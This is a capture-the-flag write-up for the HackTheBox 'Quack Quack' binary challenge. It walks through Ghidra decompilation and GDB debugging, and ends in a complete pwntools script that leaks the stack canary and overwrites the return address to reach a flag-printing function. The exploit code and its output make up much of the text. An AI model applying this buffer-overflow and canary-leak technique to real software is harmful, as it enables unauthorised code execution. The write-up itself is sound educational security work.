---
title: Quack Quack - HackTheBox Challenge Writeup
excerpt: Solving an easy challenge on HackTheBox platform.
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: false
  background_image:
    gradient: 'linear-gradient(to right, rgba(0,0,0,0.8), rgba(0,0,0,0.2))'
    src: 'assets/images/articles/quack-wallpaper.png'
aside:
  toc: true
author: Mehul Singh
show_author_profile: true
mermaid: true
key: BabyEncryption.htb-03-07-2024
tags:
  - htb
  - pwn
  - binary exploitation
  - buffer overflow
  - exploit development
  - gdb
  - pie
  - debugging
  - stack canary leak
  - rop
  - ghidra
---

# Overview

Today we will work on [HackTheBox](https://app.hackthebox.com/challenges/Quack%20Quack)'s "Quack Quack" challenge. It's a very easy challenge focusing on **buffer overflow** due to improper coding and abusing **ROP (Return-Oriented Programming)**. So let's begin!

# Fuzzing

As usual, let's simply run the application and see what we are given on the front-end.

```shell
Quack the Duck!

> test

[-] Where are your Quack Manners?!
```
An application which expects some specific input to give us what we want. From this the only thing I could find was the input size to be limited to 102 bytes. Next, let's analyze the binary itself.

# Initial Analysis

We are provided with a non-portable binary named "quack_quack" having the following properties:
```shell
$ file quack_quack
quack_quack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2,
BuildID[sha1]=225daf82164eadc6e19bee1cd1965754eefed6aa, for GNU/Linux 3.2.0, not stripped
$ checksec --file=quack_quack
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   54 Symbols        No    0               2               quack_quack
```

It doesn't have PIE enabled, but rest of the protections are. Let's now analyze the code with Ghidra.

## Ghidra Analysis

Before jumping straight into the main() function, we do see some interesting functions namely duck_attack() and duckling().


<div style="margin:0 auto;" align="center" markdown="1">
![Image](/ctf-vault/assets/images/articles/quack-functions.png){:.rounded}
</div>

If we don't find anything interesting we will come back to these, but for now let's jump to main().

### Dissecting main()

Unfortunately we don't find much in the main() function.
```c
int main(void)

{
  long lVar1;
  long in_FS_OFFSET;

  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  duckling();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The only thing of interest is that it has **stack canary protection** enabled because of `lVar1 = *(long *)(in_FS_OFFSET + 0x28);` and `if (lVar1 != *(long *)(in_FS_OFFSET + 0x28))`, which we already confirmed with `checksec` command. But apart from that, main() is only calling the function duckling(). So let's jump to that.

### Dissesting duckling()

```c
void duckling(void)

{
  char *pcVar1;
  long in_FS_OFFSET;
  char input [32];
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  input[0] = '\0';
  input[1] = '\0';
  input[2] = '\0';
  ...
  input[0x1d] = '\0';
  input[0x1e] = '\0';
  input[0x1f] = '\0';
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0,input,0x66);
  pcVar1 = strstr(input,"Quack Quack ");
  if (pcVar1 == (char *)0x0) {
    error("Where are your Quack Manners?!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ",pcVar1 + 0x20);
  read(0,&local_68,0x6a);
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This function initially defines a lot of variables, then assigns the `input` list with `\0`s and the integers with `0`s. And after printing, it reads `stdin` into the `input` list and finds a specific substring through `strstr()`, which then later exits the application if not found. Otherwise it later reads `stdin` again and stores the input at the address of `local_68`. The function at last prints a string before exiting.

### Checking duck_attack()

Remember we came across `duck_attack()` function earlier? Upon loading it, we find that this function is the one that opens the flag and prints the file. Okay so from this  we can assume we have to somehow execute this function.

```c
void duck_attack(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Let's run and debug the application with GDB

## Post Analysis Notes

There are few issues and takeaways with the above code:
1. The first `read()` function is reading 102 bytes into `input` but the variable is only assigned to use 32 bytes. This is why we were able to enter 102 bytes during our [Fuzzing](#fuzzing)
2. The `printf()` statement is printing the data present 32 bytes after the `pcVar1` variable for some reason.
3. The second `read()` statement is storing 102 bytes of stdin into the address of `local_68`.

But most importantly, can we reach the `duck_attack()` and get the flag printed with the current flow?

# Runtime Debugging

## First read()

Since we know it is trying to find the substring "Quack Quack " let's enter that with 4 A's for easy identification in registry, and we will insert breakpoint just before `strstr()` at `0x00401578` to confirm our input.

```as
(gdb) b *0x401567
Breakpoint 1 at 0x401567
(gdb) r
Quack the Duck!
> AAAAQuack Quack
Breakpoint 1, 0x0000000000401567 in duckling ()
(gdb) x /2gx $rsi
0x7fffffffdc10: 0x6361755141414141      0x206b63617551206b
```

Nice! We can see our 16 bytes in the `rsi` register. But don't forget we can fill 102 bytes and not just 32, and when the substring is found, it print the value present 32 bytes after `pcVar1` due to `printf("Quack Quack %s ...", pcVar1 + 0x20)`. So what exists in the memory from till 134 bytes from `rsi`?

```as
(gdb) x /20gx $rsi
0x7fffffffdb50: 0x6361755141414141      0x206b63617551206b
0x7fffffffdb60: 0x000000000000000a      0x0000000000000000
0x7fffffffdb70: 0x0000000000000000      0x0000000000000000
0x7fffffffdb80: 0x0000000000000000      0x0000000000000000
0x7fffffffdb90: 0x0000000000000000      0x0000000000000000
0x7fffffffdba0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbb0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbc0: 0x0000000000000000      0xb81ee3015c855d00
0x7fffffffdbd0: 0x00007fffffffdbf0      0x000000000040162a
0x7fffffffdbe0: 0x0000000000000000      0xb81ee3015c855d00
```

The value at `0xdbc8` seems like the canary value (`0xb81ee3015c855d00`), and we can reach it due to it being present at 121st byte. What's more is that the address present at `0xdbd8` is the return address to `main()` function. So maybe we can overwrite canary and change the return address to the `duck_attack()` function? At the moment we can only access the canary and not the return address. But we have the second `read()` function as well right?

## Second read()

Adding a second breakpoint at `0x4015df` right after the second `read()` function, and checking the memory again, we see that this time our input sits even closer to the canary and the return value.

```as
(gdb) b *0x4015df
Breakpoint 2 at 0x4015df
(gdb) c
Continuing.
Quack Quack , ready to fight the Duck?

> AAAAAAAAAAAAAAAA

Breakpoint 2, 0x00000000004015df in duckling ()
gef➤  x /20gx $rsi
0x7fffffffdb70: 0x4141414141414141      0x4141414141414141
0x7fffffffdb80: 0x000000000000000a      0x0000000000000000
0x7fffffffdb90: 0x0000000000000000      0x0000000000000000
0x7fffffffdba0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbb0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbc0: 0x0000000000000000      0xb81ee3015c855d00
0x7fffffffdbd0: 0x00007fffffffdbf0      0x000000000040162a
0x7fffffffdbe0: 0x0000000000000000      0xb81ee3015c855d00
0x7fffffffdbf0: 0x0000000000000001      0x00007ffff7c29d90
0x7fffffffdc00: 0x0000000000000000      0x0000000000401605
```

Now the canary is at 89th byte and the return address at 95th byte from our input. And since the second `read()` allows us to write 106 bytes, we should be able to overwrite the return address to redirect the flow to `duck_attack()` once `duckling()` returns.

# Exploitation Process

## Theory

With so much of prep work, our exploit development should be smooth. So let's finalize our plan of action:
1. From the [first read()](#first-read), the canary value at 121st byte can be reached by placing "Quack Quack " at the 90th byte (121st byte - 32 bytes from pcVar1). Technically we should be placing it at 89th byte but doing so will give us `0x00` as first byte, terminating the response. Hence we will skip that and manually add it later.
2. The `printf()` function will provide us with some binary non-printable characters which should contain the canary value.
3. Once we have the canary value, we will place it again through [second read()](#second-read) from 89th byte at address `0xdbd8`. The `rbp` value at `0xdbd0` should also be preserved, but it also works if we simply keep it 0.
4. At last, we will add the return address of `duck_attack` at the end of the payload to ultimately modify the return pointer to that function.

**Note**: Technically, we are given only 106 bytes (`0x6a`) to write with second `read()`, and 88 + 8(canary) + 8(`rbp`) is already 104 bytes. So we only have 2 bytes left to enter. Even then, since the `0x40****` is same for both return addresses, we only need to change the last two bytes! 
{:.info}

## Exploit Development

### Leaking Canary

Below is the function to exploit [first read()](#first-read) and leak the canary value.

```python
def leak_address(proc, attach=False):
    proc.recvuntil(b'> ')
    payload = b'A'*89 + b'Quack Quack '                         # Placing substring at the 90th byte
    proc.sendline(payload)
    
    response = proc.recvuntil(b'the Duck?')
    print("Response:\n", response)

    out = response.split(b'Quack Quack ')[1].split(b',')[0]
    print(f'Data extracted with offset 89: {out}')

    canary_bytes = out[:7]
    canary = u64(canary_bytes.rjust(8, b'\x00'))                # Adding 0x00 manually at the beginning
    print(f"Canary value at offset: {hex(canary)}")             # Leaked Canary

    if attach:                                                  # Attaching GDB if debugging required
        gdb.attach(proc)
        pause()
    return canary
```

### Modifying Return Address

Next is the function to securely modify the return address through [second read()](#second-read).

```python
def exploit(proc, duck_attack, canary, attach=True):
    rbp = 0x00007fffffffdbf0
    proc.recvuntil(b'> ')
    payload = b'B'*88 + p64(canary, endianness='little') + p64(rbp, endianness='little') + p64(duck_attack, endianness='little')
    proc.sendline(payload)
    res = proc.recvall(timeout=1)
    print(res.decode(errors="ignore"))
```

# Captured Flag

With the whole exploit code below, we are able to capture the flag!

```python
from pwn import *

def leak_address(proc, attach=False):
    proc.recvuntil(b'> ')
    payload = b'A'*89 + b'Quack Quack '
    proc.sendline(payload)
    
    response = proc.recvuntil(b'the Duck?')
    print("Response:\n", response)

    out = response.split(b'Quack Quack ')[1].split(b',')[0]
    print(f'Data extracted with offset 89: {out}')

    canary_bytes = out[:7]
    canary = u64(canary_bytes.rjust(8, b'\x00'))
    print(f"Canary value at offset: {hex(canary)}")

    if attach:
        gdb.attach(proc)
        pause()
    return canary

def exploit(proc, duck_attack, canary, attach=True):
    rbp = 0x00007fffffffdbf0
    proc.recvuntil(b'> ')
    payload = b'B'*88 + p64(canary, endianness='little') + p64(rbp, endianness='little') + p64(duck_attack, endianness='little')
    proc.sendline(payload)
    res = proc.recvall(timeout=1)
    print(res.decode(errors="ignore"))

def main():
    context.log_level = 'error'
    context.terminal = ['tmux', 'splitw', '-h']
    
    print("Starting exploit...")
    elf = context.binary = ELF('quack_quack')
    if args.REMOTE:
        proc = remote('94.237.120.194', 52817)
    else:
        proc = process(elf.path)
    
    duck_attack = 0x137f                                # Last 2 address bytes of the duck_attack() function
    
    canary = leak_address(proc)                         
    exploit(proc, duck_attack, canary)
    proc.close()
    print("Exploit completed.")

if __name__ == "__main__":
    main()
```

```shell
$ python exploit.py 
Starting exploit...
Response:
 b'Quack Quack =L\xbeL\x1fd~\xf0L"\xe7\xfd\x7f, ready to fight the Duck?'
Data extracted with offset 89: b'=L\xbeL\x1fd~\xf0L"\xe7\xfd\x7f'
Canary value at offset: 0x7e641f4cbe4c3d00
Did you really expect to win a fight against a Duck?!

HTB{f4k3_fl4g_4_t35t1ng}

Exploit completed.
```
